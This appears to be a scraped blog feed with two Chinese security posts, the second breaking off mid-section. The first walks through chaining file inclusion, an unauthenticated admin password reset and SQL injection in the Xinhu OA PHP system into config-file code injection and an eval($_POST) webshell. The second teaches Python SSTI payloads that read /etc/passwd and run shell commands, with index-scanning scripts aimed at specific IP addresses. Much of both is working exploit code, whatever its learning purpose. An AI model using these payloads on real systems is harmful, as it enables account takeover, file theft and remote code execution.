&lt;?phpif(!isset($ajaxbool))$ajaxbool = $rock-&gt;jm-&gt;gettoken(&#x27;ajaxbool&#x27;, &#x27;false&#x27;);$ajaxbool	= $rock-&gt;get(&#x27;ajaxbool&#x27;, $ajaxbool);$p			= PROJECT;if(!isset($m))$m=&#x27;index&#x27;;if(!isset($a))$a=&#x27;default&#x27;;if(!isset($d))$d=&#x27;&#x27;;$m			= $rock-&gt;get(&#x27;m&#x27;, $m);$a			= $rock-&gt;get(&#x27;a&#x27;, $a);$d			= $rock-&gt;get(&#x27;d&#x27;, $d);define(&#x27;M&#x27;, $m);//将$m的值赋给常量Mdefine(&#x27;A&#x27;, $a);define(&#x27;D&#x27;, $d);define(&#x27;P&#x27;, $p);$_m			= $m;if($rock-&gt;contain($m, &#x27;|&#x27;))//如果$m包含&#x27;|&#x27;且不在开头，返回true&#123;	$_mas 	= explode(&#x27;|&#x27;, $m);//通过|分割成两部分	$m 		= $_mas[0];	$_m		= $_mas[1];&#125;include_once($rock-&gt;strformat(&#x27;?0/?1/?1Action.php&#x27;,ROOT_PATH, $p));//经过strformat函数后变为了ROOT_PATH/&quot;.$p.&quot;/&quot;.$p.&quot;Action.php$rand		= date(&#x27;YmdHis&#x27;).rand(1000,9999);//当天的日期时间和随机数拼接在一起if(substr($d,-1)!=&#x27;/&#x27; &amp;&amp; $d!=&#x27;&#x27;)$d.=&#x27;/&#x27;;//$d的最后一个字符不是斜杠并且字符串不为空，则将/添加到$d的末尾$errormsg	= &#x27;&#x27;;$methodbool	= true;$actpath	= $rock-&gt;strformat(&#x27;?0/?1/?2?3&#x27;,ROOT_PATH, $p, $d, $_m);//ROOT_PATH/&quot;.$p.&quot;/&quot;.$d.&quot;&quot;.$_mdefine(&#x27;ACTPATH&#x27;, $actpath);$actfile	= $rock-&gt;strformat(&#x27;?0/?1Action.php&#x27;,$actpath, $m);//$actpath/&quot;.$m.&quot;Action.php$actfile1	= $rock-&gt;strformat(&#x27;?0/?1Action.php&#x27;,$actpath, $_m);//$actpath/&quot;.$_m.&quot;Action.php$actbstr 	= null;if(file_exists($actfile1))include_once($actfile1);if(file_exists($actfile))&#123;	include_once($actfile);//包含的文件可控	$clsname	= &#x27;&#x27;.$m.&#x27;ClassAction&#x27;;	$xhrock		= new $clsname();	$actname	= &#x27;&#x27;.$a.&#x27;Action&#x27;;	if($ajaxbool == &#x27;true&#x27;)$actname	= &#x27;&#x27;.$a.&#x27;Ajax&#x27;;	if(method_exists($xhrock, $actname))//$xhrock类中是否存在$actname方法，存在为true    &#123;		$xhrock-&gt;beforeAction();		$actbstr = $xhrock-&gt;$actname();//直接调用该方法		$xhrock-&gt;bodyMessage = $actbstr;		if(is_string($actbstr))&#123;echo $actbstr;$xhrock-&gt;display=false;&#125;//结果是否为字符串，打印结果		if(is_array($actbstr))&#123;echo json_encode($actbstr);$xhrock-&gt;display=false;&#125;//结果是否为数组，打印结果	&#125;else&#123;		$methodbool = false;		if($ajaxbool == &#x27;false&#x27;)echo &#x27;&#x27;.$actname.&#x27; not found;&#x27;;	&#125;	$xhrock-&gt;afterAction();&#125;else&#123;	echo &#x27;actionfile not exists;&#x27;;	$xhrock		= new Action();&#125;$_showbool = false;if($xhrock-&gt;display &amp;&amp; ($ajaxbool == &#x27;html&#x27; || $ajaxbool == &#x27;false&#x27;))//条件满足，执行模板渲染&#123;	$xhrock-&gt;smartydata[&#x27;p&#x27;]	= $p;	$xhrock-&gt;smartydata[&#x27;a&#x27;]	= $a;	$xhrock-&gt;smartydata[&#x27;m&#x27;]	= $m;	$xhrock-&gt;smartydata[&#x27;d&#x27;]	= $d;	$xhrock-&gt;smartydata[&#x27;rand&#x27;]	= $rand;	$xhrock-&gt;smartydata[&#x27;qom&#x27;]	= QOM;	$xhrock-&gt;smartydata[&#x27;path&#x27;]	= PATH;	$xhrock-&gt;smartydata[&#x27;sysurl&#x27;]= SYSURL;	$temppath					= &#x27;&#x27;.ROOT_PATH.&#x27;/&#x27;.$p.&#x27;/&#x27;;	$tplpaths					= &#x27;&#x27;.$temppath.&#x27;&#x27;.$d.&#x27;&#x27;.$m.&#x27;/&#x27;;	$tplname					= &#x27;tpl_&#x27;.$m.&#x27;&#x27;;	if($a!=&#x27;default&#x27;)$tplname  .= &#x27;_&#x27;.$a.&#x27;&#x27;;	$tplname				   .= &#x27;.&#x27;.$xhrock-&gt;tpldom.&#x27;&#x27;;	$mpathname					= $tplpaths.$tplname;	if($xhrock-&gt;displayfile!=&#x27;&#x27; &amp;&amp; file_exists($xhrock-&gt;displayfile))$mpathname = $xhrock-&gt;displayfile;	if(!file_exists($mpathname) || !$methodbool)&#123;		if(!$methodbool)&#123;			$errormsg	= &#x27;in (&#x27;.$m.&#x27;) not found Method(&#x27;.$a.&#x27;);&#x27;;		&#125;else&#123;			$errormsg	= &#x27;&#x27;.$tplname.&#x27; not exists;&#x27;;		&#125;		echo $errormsg;	&#125;else&#123;		$_showbool = true;	&#125;&#125;if($xhrock-&gt;display &amp;&amp; ($ajaxbool == &#x27;html&#x27; || $xhrock-&gt;tpltype==&#x27;html&#x27; || $ajaxbool == &#x27;false&#x27;) &amp;&amp; $_showbool)&#123;	$xhrock-&gt;setHtmlData();	$da = $xhrock-&gt;smartydata;	foreach($xhrock-&gt;assigndata as $_k=&gt;$_v)$$_k=$_v;	include_once($mpathname);	$_showbool = false;&#125;

对于ROOT_PATH的分析：
define(&#x27;ROOT_PATH&#x27;,str_replace(&#x27;\\&#x27;,&#x27;/&#x27;,dirname(dirname(__FILE__))));	//系统根目录路径

该常量会默认为是系统的根目录
对于PROJECT的分析：
if(!defined(&#x27;PROJECT&#x27;))define(&#x27;PROJECT&#x27;, $rock-&gt;get(&#x27;p&#x27;, &#x27;webmain&#x27;));

上述代码说明了要是变量p没有值那么会默认为webmain，常量PROJECT的值便为webmain目录
文件\include\Action.php中public $smartydata = array();  //模版数据说明了$smartydata为模板数据数组（用不到）
下面为两个比较重要的方法
public function strformat($str)&#123;    $len = func_num_args();//func_num_args()得到传入该函数的参数数量并传给$len    $arr = array();    for($i=1; $i&lt;$len; $i++)$arr[] = func_get_arg($i);//从第二个参数开始添加到数组$arr的末尾    //为什么从i=1开始？因为格式化字符串函数传入的第一个参数是含占位符的待格式化字符串    $s  = $this-&gt;stringformat($str, $arr);    return $s;&#125;............public function stringformat($str, $arr=array())&#123;    $s	= $str;    for($i=0; $i&lt;count($arr); $i++)&#123;        $s=str_replace(&#x27;?&#x27;.$i.&#x27;&#x27;, $arr[$i], $s);        //占位符为&#x27;?&#x27;加上一个数字代表用后面第几个参数来填充该位置    &#125;    return $s;&#125;

通过对$m,$a,$d三个变量值的控制，我们可以实现包含我们自己想要包含的任意文件，并调用我们自己需要的方法，比如
这里有个一路径中的变量$actpath，被两个下文被包含住的变量$actfile以及$actfile1给拼接，弄明白是如何构造的：
用ROOT_PATH，$p，$d，$_m分别填充前面的一个格式化路径
$_m我们可以控制GET传入m参数时’|’字符两边的字符串来控制，$p和ROOT_PATH，$d在上面存在一个简单的处理，如果不是以’&#x2F;‘结尾就给他加上’&#x2F;‘
总结起来，假设我们的根目录是&#x2F;var&#x2F;www&#x2F;html&#x2F;，传入p&#x3D;webmain&amp;d&#x3D;task&amp;m&#x3D;file|api
那么$actpath就是”&#x2F;var&#x2F;www&#x2F;html&#x2F;webmain&#x2F;task&#x2F;api”
紧接着下面的$actfile就是”&#x2F;var&#x2F;www&#x2F;html&#x2F;webmain&#x2F;task&#x2F;api&#x2F;fileAction.php”
其实actfile1我们并不能做到真正完全的可控，因为其最后的拼接是$_m.$_m，就意味着最后包含的php文件的前缀名必须与上级目录相同，具有一定的局限性，这里我们侧重观察actfile被包含后的操作(实际上actfile1被包含后也确实并没有进行更多的操作了)，接下来的分析围绕着actfile，$classname变量由$a和”ClassAction”拼接起来，$a可控。，$actname变量由$a和”Action”拼接起来，$a可控。如果ajaxbool为true那么$actname由$a和”Ajax”拼接，$ajaxbool可控(前文提到控制GET传参)。然后new一个名为$classname的值的类，判断该对象中是否存在名为$actname的方法，如果存在，就执行并把结果echo出来
寻找漏洞修改密码接下来我们的工作就是要找到一个可以利用的类中的方法，这个时候我们注意到了\webmain\task\api\reimplatAction.php，如下：
&lt;?php class reimplatClassAction extends apiAction&#123;	public function initAction()	&#123;		$this-&gt;display= false;	&#125;		//平台上通知过来的数据	public function indexAction()	&#123;		$body = $this-&gt;getpostdata();//下面篇幅中有关于该方法的具体代码，无任何过滤		if(!$body)return;		$db 	 = m(&#x27;reimplat:dept&#x27;);		$key 	 = $db-&gt;gethkey();//密钥，不需要关注		$bodystr = $this-&gt;jm-&gt;strunlook($body, $key);		if(!$bodystr)return;			$data 	 = json_decode($bodystr, true);		$msgtype = arrvalue($data,&#x27;msgtype&#x27;);		$msgevent= arrvalue($data,&#x27;msgevent&#x27;);				//用户状态改变停用		if($msgtype==&#x27;subscribe&#x27;)&#123;			$user 	= arrvalue($data, &#x27;user&#x27;);			$zt 	= &#x27;0&#x27;;			if($msgevent==&#x27;yes&#x27;)$zt = &#x27;1&#x27;;			if($msgevent==&#x27;stop&#x27;)$zt = &#x27;2&#x27;;			$db-&gt;update(&#x27;`status`=&#x27;.$zt.&#x27;&#x27;,&quot;`user`=&#x27;$user&#x27;&quot;);		&#125;				//修改手机号		if($msgtype==&#x27;editmobile&#x27;)&#123;			$user 	= arrvalue($data, &#x27;user&#x27;);			$mobile = arrvalue($data, &#x27;mobile&#x27;);			$where  = &quot;`user`=&#x27;$user&#x27;&quot;;			$upstr  = &quot;`mobile`=&#x27;$mobile&#x27;&quot;;			$db-&gt;update($upstr, $where);			$dbs	= m(&#x27;admin&#x27;);			$dbs-&gt;update($upstr,$where);			$uid 	= $dbs-&gt;getmou(&#x27;id&#x27;,$where);			m(&#x27;userinfo&#x27;)-&gt;update($upstr,&quot;`id`=&#x27;$uid&#x27;&quot;);		&#125;				//修改密码		if($msgtype==&#x27;editpass&#x27;)&#123;			$user = arrvalue($data, &#x27;user&#x27;);			$pass = arrvalue($data, &#x27;pass&#x27;);			if($pass &amp;&amp; $user)&#123;				$where  = &quot;`user`=&#x27;$user&#x27;&quot;;				$mima 	= md5($pass);				m(&#x27;admin&#x27;)-&gt;update(&quot;`pass`=&#x27;$mima&#x27;,`editpass`=`editpass`+1&quot;, $where);			&#125;		&#125;//感觉可以操作一下	&#125;&#125;

上述代码中的getpostdata函数：
public function getpostdata()	&#123;		$postdata = &#x27;&#x27;;		if(isset($GLOBALS[&#x27;HTTP_RAW_POST_DATA&#x27;]))$postdata = $GLOBALS[&#x27;HTTP_RAW_POST_DATA&#x27;];		if($postdata==&#x27;&#x27;)$postdata = trim(file_get_contents(&#x27;php://input&#x27;));    	//trim方法去除字符串首尾处的空白字符		return $postdata;	&#125;

发现很有用的地方，该函数没有任何过滤，并且通过php://input伪协议来获取POST进去的数据，可以利用一下
对于strunlook()方法，我们溯源后发现是一个字符串解密的函数，位于&#x2F;include&#x2F;chajian&#x2F;jmChajian.php文件中，溯源过程如下：
$bodystr = $this-&gt;jm-&gt;strunlook($body, $key);//溯源this-&gt;jm$this-&gt;jm		= c(&#x27;jm&#x27;, true);//Action.php//继续溯源c方法function c($name, $inbo=true, $param1=&#x27;&#x27;, $param2=&#x27;&#x27;)&#123;	$class	= &#x27;&#x27;.$name.&#x27;Chajian&#x27;;	$path	= &#x27;&#x27;.ROOT_PATH.&#x27;/include/chajian/&#x27;.$class.&#x27;.php&#x27;;	$cls	= NULL;	if(file_exists($path))&#123;		include_once($path);		if($inbo)$cls	= new $class($param1, $param2);	&#125;	return $cls;	&#125;//位于rockFun.php//该方法会包含文件$nameChajian.php，这里我们要溯源到jmChajian.php，找到了strunlook方法（对数据简单解密）

在reimplatAction.php中，我们可以利用indexAction()方法，通过它来修改账户的密码
所以现在的思路：传入加密后的json数据，让后台进行自动解密，通过输入相应的键值对来修改密码
因此json数据中我们需要的键值对如下：
&#123;&quot;msgtype&quot;:&quot;editpass&quot;,&quot;user&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;admin&quot;&#125;

首先我们在本地测试的时候需要在reimplatAction.php文件中的添加相关代码，从而获取到加密后的json数据，如下：

利用bp抓包，然后进行操作：get传参?p=webmain&amp;d=task&amp;m=reimplat|api&amp;a=index，接着再加我们所需的json代码，如下：

得到加密后的json内容，继续操作：
由于输入的是加密后的json内容，后台会自动解码配对修改账户密码，这样子我们就成功修改了admin的密码
退出账号，输入修改后的密码，成功登录
实现rce但是这样子的话我们仅仅能做到的也就是修改修改账户的密码，不应满足于此，继续查看代码
在&#x2F;webmain&#x2F;system&#x2F;cog&#x2F;cogAction.php下：
cogClassAction::savecongAjax()方法中有一处文件写入，只要可以控制$adminname就可以控制任意文件写入
对$adminname进行溯源，发现此字段会从数据库中取admin的name，所以我们只需要找到一个注入点，成功注入便可以利用

原本我们输入的$adminname会被注释掉，而我们需要摆脱被注释掉的命运，所以要在输入内容的开头来上一个/n进行换行，同时在末尾加上//使得后续不是我们输入的内容全被注释掉
实质上我们输入的为字符串，并且该字符串会写入一个文件中，成功写入回显ok
对$_confpath进行溯源，具体代码为$_confpath = $this-&gt;rock-&gt;strformat(&#39;?0/?1/?1Config.php&#39;, ROOT_PATH, PROJECT);
发现$thia-&gt;adminname其实就是写入配置文件webmainConfig.php中

然后我们对reimplatAction.php文件中的m方法进行溯源，具体代码如下：
function m($name)&#123;    $cls      = NULL;    $pats     = $nac = &#x27;&#x27;;    $nas      = $name;    $asq      = explode(&#x27;:&#x27;, $nas);    if(count($asq)&gt;1)&#123;       $nas   = $asq[1];       $nac   = $asq[0];       $pats  = $nac.&#x27;/&#x27;;       $_pats = &#x27;&#x27;.ROOT_PATH.&#x27;/&#x27;.PROJECT.&#x27;/model/&#x27;.$nac.&#x27;/&#x27;.$nac.&#x27;.php&#x27;;       if(file_exists($_pats))&#123;          include_once($_pats);          $class = &#x27;&#x27;.$nac.&#x27;Model&#x27;;          $cls   = new $class($nas);       &#125;      &#125;    $class    = &#x27;&#x27;.$nas.&#x27;ClassModel&#x27;;    $path     = &#x27;&#x27;.ROOT_PATH.&#x27;/&#x27;.PROJECT.&#x27;/model/&#x27;.$pats.&#x27;&#x27;.$nas.&#x27;Model.php&#x27;;    if(file_exists($path))&#123;       include_once($path);       if($nac!=&#x27;&#x27;)$class= $nac.&#x27;_&#x27;.$class;       $cls   = new $class($nas);    &#125;    if($cls==NULL)$cls = new sModel($nas);    return $cls;&#125;

可以得到该方法是把&#x2F;webmain&#x2F;model&#x2F;下的php文件包含起来了
m方法的参数是$name，实际上我们操作的表名是xinhu_$name
综上，我选择的是reimplatAction.php文件中的修改mobile处，从那里下手进行sql注入，这样子我们就需要溯源到底层的update()方法，明白其具体的sql语句，从而进行绕过
最底层的update方法如下所示：
public function update($table,$content,$where)	&#123;		$where = $this-&gt;getwhere($where);		$sql=&quot;update `$table` set $content where $where &quot;;		return $this-&gt;tranbegin($sql);	&#125;	

在文件中的已经指定了$table的内容，即admin和其他两个表，$where的内容为=&quot;user=&#39;$user&#39;&quot;，$content在具体代码中即$upstr,即= &quot;mobile=&#39;$mobile&#39;&quot;;，因此我们传入的json数据需为以下格式：
&#123;&quot;msgtype&quot;:&quot;editmobile&quot;,&quot;user&quot;:&quot;&quot;,&quot;mobile&quot;:&quot;&quot;&#125;

在sql文件中看到xinhu_admin表中的mobile字段处是输入字符串，因此我们需要逃出单引号包裹
并且我们要改的字段名为name，也是需要输入字符串的
最终我们需要传入的json数据如下：
&#123;&quot;msgtype&quot;:&quot;editmobile&quot;,&quot;user&quot;:&quot;admin&quot;,&quot;mobile&quot;:&quot;123&#x27;,name=&#x27;\nphpinfo();//&quot;&#125;


然后再把加密后的json文件再传一遍，查看xinhu_admin表，可以看见admin的name已经发生了改变

接着我们查看配置文件，发现并没有任何修改，这是为什么
这是因为我们还没有调用$adminname所属的savecongAjax()方法，变量还没有被写入配置文件中
所以我们在重新登陆后需要包含的内容如下：
?p=webmain&amp;d=system&amp;m=cog|cog&amp;ajaxbool=true&amp;a=savecong

成功包含

再刷新一遍页面，如下：

成功实现了phpinfo()，这也说明了我们可以实现rce了，但是要注意name字段有长度限制，所以一句话木马不能够太长
接着实现rce，更改json文件如下：
&#123;&quot;msgtype&quot;:&quot;editmobile&quot;,&quot;user&quot;:&quot;admin&quot;,&quot;mobile&quot;:&quot;123&#x27;,name=&#x27;\neval($_POST[1]);//&quot;&#125;

剩下的操作和上面实现phpinfo()的操作一模一样，然后我们尝试用蚁剑连接


成功连接上，实现rce
]]></content>
  </entry>
  <entry>
    <title>ssti学习</title>
    <url>/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[常用魔术方法__class____class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 __class__ 是类的一个内置属性，表示类的类型，返回 &lt;type &#39;type&#39;&gt; ； 也是类的实例的属性，表示实例对象的类。
&gt;&gt;&gt; &#x27;&#x27;.__class__&lt;type &#x27;str&#x27;&gt;&gt;&gt;&gt; ().__class__&lt;type &#x27;tuple&#x27;&gt;&gt;&gt;&gt; [].__class__&lt;type &#x27;list&#x27;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type &#x27;dict&#x27;&gt;

获取基类__bases__：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的元组（虽然只有一个元素）。注意是直接父类！！！
&gt;&gt;&gt; ().__class__.__bases__(&lt;type &#x27;object&#x27;&gt;,)&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__(&lt;type &#x27;basestring&#x27;&gt;,)&gt;&gt;&gt; [].__class__.__bases__(&lt;type &#x27;object&#x27;&gt;,)&gt;&gt;&gt; &#123;&#125;.__class__.__bases__(&lt;type &#x27;object&#x27;&gt;,)&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__bases__[0]   // python2下与python3下不同&lt;type &#x27;object&#x27;&gt;&gt;&gt;&gt; [].__class__.__bases__[0]&lt;type &#x27;object&#x27;&gt;

获取基类还能用 __mro__ 方法，__mro__ 方法可以用来获取一个类的调用顺序，比如：
class A:    def foo(self):        print(&quot;A&quot;)class B(A):    passclass C(A):    def foo(self):        print(&quot;C&quot;)class D(B, C):    passprint(D.__mro__)

输出结果如下：
(&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)

在这个例子中，类 D 的 MRO 顺序是 D -&gt; B -&gt; C -&gt; A -&gt; object。这意味着在搜索方法时，Python 解释器会先在 D 中查找，然后按照 B -&gt; C -&gt; A -&gt; object 的顺序依次查找父类，直到找到匹配的方法或属性
除此之外，我们还可以利用 __base__ 方法获取直接基类：
&gt;&gt;&gt; &quot;&quot;.__class__.__base__&lt;type &#x27;basestring&#x27;&gt;

有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（&lt;class&#39;object&#39;&gt;）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。
__subclasses__()在 Python 中，__subclasses__() 是一个特殊方法（也称为魔术方法或魔术属性），用于获取当前类的直接子类列表。
当你调用一个类的 __subclasses__() 方法时，它会返回一个包含所有直接子类的列表。这些子类是在程序运行时动态创建的，因此列表的内容取决于程序执行的上下文和流程。
以下是一个简单的示例：
class A:    passclass B(A):    passclass C(A):    passclass D(B):    passprint(A.__subclasses__())  # 输出 [&lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;]print(B.__subclasses__())  # 输出 [&lt;class &#x27;__main__.D&#x27;&gt;]

在这个示例中，类 A 有两个直接子类 B 和 C，类 B 有一个直接子类 D。因此，调用 A.__subclasses__() 返回的列表包含了 B 和 C，而调用 B.__subclasses__() 返回的列表只包含了 D
注意：这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。
当然我们也可以直接用object.__subclasses__()，会得到和上面一样的结果。SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。
__builtins__在 Python 中，__builtins__ 是一个指向内建模块（built-in module）的引用。这个模块包含了 Python 中内置的常用函数、异常和其他对象。
__builtins__ 变量是一个字典，包含了内建模块中所有的内置函数和对象。你可以通过 __builtins__ 字典来访问这些内置函数和对象。
例如，你可以通过 __builtins__[&#39;print&#39;] 来访问内置的 print 函数，或者通过 __builtins__[&#39;TypeError&#39;] 来访问内置的 TypeError 异常类。
但是在实际编码中，我们通常直接使用内置函数和对象的名称，而不是通过 __builtins__ 来访问。例如，我们通常使用 print() 函数而不是 __builtins__[&#39;print&#39;]。
需要注意的是，在一些限制性的环境中，比如一些解释器中或者在使用了 __import__() 函数时，可能会限制对 __builtins__ 的直接访问。
__globals__在 Python 中，__globals__ 是一个特殊属性，用于访问包含当前作用域中所有全局变量的字典。这个属性是一个字典，它包含了当前作用域中所有全局变量的名称和对应的值。
在 Python 中，每个作用域都有一个与之相关联的 __globals__ 字典，用于存储该作用域中的全局变量。这个字典可以通过访问作用域对象的 __globals__ 属性来获取
例子如下：
x = 10  # 定义一个全局变量 xdef func():    y = 20  # 定义一个局部变量 y    print(&quot;Global variables:&quot;, globals())  # 输出全局变量字典    print(&quot;Value of x:&quot;, globals()[&#x27;x&#x27;])  # 输出全局变量 x 的值func()  # 调用函数

利用 SSTI 读取文件Python 2在上文中我们使用 __subclasses__ 方法查看子类的时候，发现可以发现索引号为40指向file类：
for i in enumerate(&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()): print i.....(0, &lt;type &#x27;type&#x27;&gt;)(1, &lt;type &#x27;weakref&#x27;&gt;)(2, &lt;type &#x27;weakcallableproxy&#x27;&gt;)(3, &lt;type &#x27;weakproxy&#x27;&gt;)(4, &lt;type &#x27;int&#x27;&gt;)(5, &lt;type &#x27;basestring&#x27;&gt;)(6, &lt;type &#x27;bytearray&#x27;&gt;)(7, &lt;type &#x27;list&#x27;&gt;)(8, &lt;type &#x27;NoneType&#x27;&gt;)(9, &lt;type &#x27;NotImplementedType&#x27;&gt;)(10, &lt;type &#x27;traceback&#x27;&gt;)(11, &lt;type &#x27;super&#x27;&gt;)(12, &lt;type &#x27;xrange&#x27;&gt;)(13, &lt;type &#x27;dict&#x27;&gt;)(14, &lt;type &#x27;set&#x27;&gt;)(15, &lt;type &#x27;slice&#x27;&gt;)(16, &lt;type &#x27;staticmethod&#x27;&gt;)(17, &lt;type &#x27;complex&#x27;&gt;)(18, &lt;type &#x27;float&#x27;&gt;)......(38, &lt;type &#x27;ellipsis&#x27;&gt;)(39, &lt;type &#x27;member_descriptor&#x27;&gt;)(40, &lt;type &#x27;file&#x27;&gt;)(41, &lt;type &#x27;PyCapsule&#x27;&gt;)(42, &lt;type &#x27;cell&#x27;&gt;)(43, &lt;type &#x27;callable-iterator&#x27;&gt;)......

for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print i分析如下：

&#39;&#39;.__class__: 获取空字符串 &#39;&#39; 的类型，即 str 类型。
&#39;&#39;.__class__.__mro__: 获取 str 类型的方法解析顺序（Method Resolution Order，MRO），这是一个元组，包含了当前类和它的父类的顺序。
&#39;&#39;.__class__.__mro__[-1]: 获取方法解析顺序中的最后一个类，即 object 类。
&#39;&#39;.__class__.__mro__[-1].__subclasses__(): 获取 object 类的所有子类，这是一个列表。
enumerate(...): 对获取到的子类列表进行枚举，返回索引和对应的元素组成的元组。
for i in ...: print i: 遍历枚举后的元组列表，并打印每个元组。

综上所述，这段代码的作用是遍历 object 类的所有直接子类，并输出它们的索引和对应的子类
此file类可以直接用来读取文件：
&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;

Python 3使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; 这个类去读取文件。
首先编写脚本遍历目标Python环境中 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; 这个类索引号：
import requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;FileLoader&#x27; in res.text:        print(i)# 得到编号为79

所以payload如下：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[79][&quot;get_data&quot;](0, &quot;/etc/passwd&quot;)&#125;&#125;


&#123;&#123; ... &#125;&#125;: 双大括号通常用于表示模板语法，它们可能用于在某些 Web 框架中进行模板渲染，比如在前端的 Vue.js 或 AngularJS 中，或者在后端的像 Flask、Django 等 Web 框架中。
().__class__: 这是 Python 中创建一个空的元组，并访问该元组的类。元组的类是 &lt;class &#39;tuple&#39;&gt;。
().__class__.__bases__: 这是访问 &lt;class &#39;tuple&#39;&gt; 类的基类，它的基类是 &lt;class &#39;object&#39;&gt;。
().__class__.__bases__[0]: 这是获取 &lt;class &#39;tuple&#39;&gt; 类的基类中的第一个元素，即 &lt;class &#39;object&#39;&gt;。
().__class__.__bases__[0].__subclasses__(): 这是获取 Python 中 &lt;class &#39;object&#39;&gt; 类的所有子类。这个调用会返回一个包含所有子类的列表。
[&quot;get_data&quot;]: 这是对子类对象的属性进行访问，可能是希望访问第 79 个子类对象中名为 get_data 的方法。
(0, &quot;/etc/passwd&quot;): 这是作为参数传递给 get_data 方法的值，可能是为了触发某种行为。

利用 SSTI 执行命令寻找内建函数 eval 执行命令遍历目标Python环境中含有内建函数 eval 的子类的索引号：
import requestsif __name__ == &quot;__main__&quot;:    post_url = &quot;http://124.70.99.199:10086/level/1&quot;    for i in range(200):        param = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=param)        if &#x27;eval&#x27; in res.text:            print(i,&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i,res.text,res.status_code,&quot;no&quot;)

所以随便挑一个构造payload为：&#123;&#123;''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')&#125;&#125;

__import__(&quot;os&quot;)：这是 Python 中的一种导入模块的方法。os 是 Python 标准库中用于与操作系统交互的模块，它包含了许多与文件和目录处理、进程管理等相关的函数和方法。
.popen(&quot;ls /&quot;)：popen() 是 os 模块中的一个函数，用于执行系统命令并返回命令的输出。在这里，&quot;ls /&quot; 是一个系统命令，用于列出根目录 / 下的文件和目录列表。
.read()：read() 是 popen() 返回的文件对象的方法，用于读取文件内容。

寻找 os 模块执行命令自己在靶场里面尝试失败
首先编写脚本遍历目标Python环境中含有os模块的类的索引号：
import requestsif __name__ == &#x27;__main__&#x27;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(200):        data = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=data)        if &#x27;os.py&#x27; in res.text:            print(i, &#x27;!!!!!!&#x27;)        else:            print(i, res.text, res.status_code,&quot;NO&quot;)

挑一个构造payload：&#123;&#123;''.__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['os'].popen('ls /').read()&#125;&#125;
寻找 popen 函数执行命令首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：
import requestsif __name__ == &quot;__main__&quot;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(200):        data = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=data)        if &#x27;popen&#x27; in res.text:            print(i, &quot;!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i, res.text, res.status_code, &quot;NO&quot;)

挑一个构造payload：&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['popen']("ls /").read()&#125;&#125;
寻找 importlib 类执行命令Python 中存在 &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt; 类，目的就是提供 Python 中 import 语句的实现（以及 __import__ 函数）。那么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。
首先编写脚本遍历目标Python环境中 importlib 类的索引号：
import requestsif __name__ == &quot;__main__&quot;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(200):        data = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=data)        if &#x27;_frozen_importlib.BuiltinImporter&#x27; in res.text:            print(i, &quot;!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i, res.text, res.status_code, &quot;NO&quot;)

构造payload：&#123;&#123;[].__class__.__base__.__subclasses__()[120]["load_module"]("os")["popen"]("ls /").read()&#125;&#125;
寻找 linecache 函数执行命令linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以可以利用这个 linecache 函数去执行命令。
首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：
